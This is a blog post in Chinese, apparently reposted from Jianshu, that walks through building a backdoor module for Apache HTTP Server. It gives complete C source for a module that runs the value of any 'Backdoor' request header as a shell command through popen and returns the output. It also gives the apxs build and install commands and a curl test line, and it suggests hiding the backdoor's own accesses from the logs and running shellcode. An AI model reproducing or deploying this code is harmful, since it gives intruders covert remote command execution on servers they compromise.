---
layout: post
title: Apache HTTP Server 后门开发
subtitle: 2017/11/29
date: 2017-11-29
author: FR
header-img: img/depot/post-butiao.jpg
catalog: true
tags:
    - apache
    - backdoor
---

- **来自简书 [【简书链接】](http://www.jianshu.com/p/9d9248922508)**

> 参考文档:  
> https://httpd.apache.org/docs/2.4/developer/modguide.html

## 需求分析 :
实现一个执行任意命令的功能。

攻击者在目标服务器植入后门以后 , 一旦攻击者向服务器发送的HTTP请求存在 Backdoor 这个请求头 , Backdoor 这个请求头的值作为命令执行.

例如 :
```
GET / HTTP/1.1
Host: localhost
Cookie: key=value
Backdoor: COMMAND
```

如果服务器接收到这个请求头, 那么执行 COMMAND 这个命令并将结果显示在响应体中.

为了实现这个功能 , 我们需要了解以下的API。

    1. Apache扩展的结构
    2. 获取一个HTTP请求所有请求头
    3. 获取请求头的值
    4. 执行系统命令并且获取结果

## 1. 利用 apxs 生成一个扩展的基本模板结构
```
apxs -g -n backdoor
```

![img/2017-11-29/2355077-d529a92f6e936e7e.png](http://upload-images.jianshu.io/upload_images/2355077-d529a92f6e936e7e.png)

## 2. 根据 Apache 的文档可以得知 :
![img/2017-11-29/2355077-ce6de7dbae48078e.png](http://upload-images.jianshu.io/upload_images/2355077-ce6de7dbae48078e.png)

所有的请求头位于 :
```
r->headers_in 这个结构体中
```

我们只需要遍历请求头就可以得知是否需要触发这个后门。

每一个请求头是一个 apr_table_t 结构体的指针。

我们再来查询一下这个结构体的实现：

   > https://apr.apache.org/docs/apr/2.0/group__apr__tables.html#gad7ea82d6608a4a633fc3775694ab71e4  
   > https://apr.apache.org/docs/apr/1.6/apr__tables_8h_source.html

![img/2017-11-29/2355077-e774ccf4b1b19841.png](http://upload-images.jianshu.io/upload_images/2355077-e774ccf4b1b19841.png)

官方文档中也给出了遍历请求头的实例代码。

![img/2017-11-29/2355077-9db28525fd861584.png](http://upload-images.jianshu.io/upload_images/2355077-9db28525fd861584.png)

我们只需要检测这个 Backdoor 有没有出现在请求头中。

如果出现则执行命令并输出即可。

## 3. 实现代码如下 :
```
/*
**  mod_backdoor.c -- Apache sample backdoor module
**  [Autogenerated via ``apxs -n backdoor -g'']
**
**  To play with this sample module first compile it into a
**  DSO file and install it into Apache's modules directory
**  by running:
**
**    $ apxs -c -i mod_backdoor.c
**
**  Then activate it in Apache's apache2.conf file for instance
**  for the URL /backdoor in as follows:
**
**    #   apache2.conf
**    LoadModule backdoor_module modules/mod_backdoor.so
**    <Location /backdoor>
**    SetHandler backdoor
**    </Location>
**
**  Then after restarting Apache via
**
**    $ apachectl restart
**
**  you immediately can request the URL /backdoor and watch for the
**  output of this module. This can be achieved for instance via:
**
**    $ lynx -mime_header http://localhost/backdoor
**
**  The output should be similar to the following one:
**
**    HTTP/1.1 200 OK
**    Date: Tue, 31 Mar 1998 14:42:22 GMT
**    Server: Apache/1.3.4 (Unix)
**    Connection: close
**    Content-Type: text/html
**
**    The sample page from mod_backdoor.c
*/

#include "httpd.h"
#include "http_config.h"
#include "http_protocol.h"
#include "ap_config.h"
#include <stdio.h>
#include <stdlib.h>

/* The sample content handler */
static int backdoor_handler(request_rec *r)
{
    /*
    if (strcmp(r->handler, "backdoor")) {
        return DECLINED;
    }
    r->content_type = "text/html";

    if (!r->header_only)
        ap_rputs("The sample page from mod_backdoor.c\n", r);
    */
    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
    const apr_array_header_t    *fields;
    int                         i;
    apr_table_entry_t           *e = 0;
    char FLAG = 0;
    /*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

    fields = apr_table_elts(r->headers_in);
    e = (apr_table_entry_t *) fields->elts;

    for(i = 0; i < fields->nelts; i++) {
        if(strcmp(e[i].key, "Backdoor") == 0){
            FLAG = 1;
            break;
        }
    }

    if (FLAG){
        char * command = e[i].val;
        ap_rprintf(r, "Command: %s\n", command);
        ap_rprintf(r, "Result: \n", command);
        FILE* fp = popen(command,"r");
        char buffer[0x100] = {0};
        int counter = 1;
        while(counter){
            counter = fread(buffer, 1, sizeof(buffer), fp);
            ap_rwrite(buffer, counter, r);
        }
        pclose(fp);
    }
    return OK;
}

static void backdoor_register_hooks(apr_pool_t *p)
{
    ap_hook_handler(backdoor_handler, NULL, NULL, APR_HOOK_MIDDLE);
}

/* Dispatch list for API hooks */
module AP_MODULE_DECLARE_DATA backdoor_module = {
    STANDARD20_MODULE_STUFF,
    NULL,                  /* create per-dir    config structures */
    NULL,                  /* merge  per-dir    config structures */
    NULL,                  /* create per-server config structures */
    NULL,                  /* merge  per-server config structures */
    NULL,                  /* table of config file commands       */
    backdoor_register_hooks  /* register hooks                      */
};
```

然后即可使用命令 :
```
apxs -i -a -c mod_backdoor.c && service apache2 restart
```

来验证安装。

验证效果如下 :
```
curl 'http://localhost/index.php' -H 'Backdoor: id'
```

![img/2017-11-29/2355077-ae452272818dccc1.png](http://upload-images.jianshu.io/upload_images/2355077-ae452272818dccc1.png)

但是这里存在一些问题 , 我们开发的这个 apache 的 module 会对每一个请求都生效。

如果我们不添加 Backdoor 这个请求头 , 那么正常情况应该是就相当于没有这个模块 , 原本该怎么处理这个请求就怎么处理这个请求。

但是 , 我们的假设似乎并没有成立。

又去翻了翻 Apache 的文档 , 在网上也找了一些文章。

参考文章 :

   > http://blog.csdn.net/ConeZXY/article/details/1897989  
   > http://blog.csdn.net/ConeZXY/article/details/1898000  
   > http://blog.csdn.net/ConeZXY/article/details/1898019  
   > http://zjwyhll.blog.163.com/blog/static/7514978120126254222294/  
   > http://www.apachetutor.org/dev/request

找到了一个解决方案是将函数 `backdoor_handler` 的返回值由 `OK` 修改为 `DECLINED`。

![img/2017-11-29/2355077-e573757c5851e39b.png](http://upload-images.jianshu.io/upload_images/2355077-e573757c5851e39b.png)

如果返回 `OK` , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且没有发生错误。

如果返回 `DONE` , 这个模块就会通知服务器 , 我们已经处理完成了这个请求 , 并且已经不需要再进行后续的处理了。

如果返回 `DECLINED` , 则表示这个模块不需要对这个请求进行处理 , 那么服务器就会继续对其进行默认的处理。

可以参考图片 :
![img/2017-11-29/2355077-742302e80c31b09e.png](http://upload-images.jianshu.io/upload_images/2355077-742302e80c31b09e.png)

   > PS :   
   > 感觉这种处理方式好像还是欠妥 , 但是也只能找到这种方法来先凑合一下使用了

这样我们就实现了对这个后门的编写。

在此基础上我们也可以对这个后门进行扩展。

例如 HOOK 住日志处理的过程, 让我们访问后门的日志不被记录等等。

例如修改命令执行的逻辑, 直接改成 shellcode 跳转到 shellcode 去执行等等

   > 代码 :
   > https://github.com/WangYihang/Apache_HTTP_Server_Module_Backdoor


***作者：王一航***  
***链接：http://www.jianshu.com/p/9d9248922508***  
***來源：简书***  
***著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。***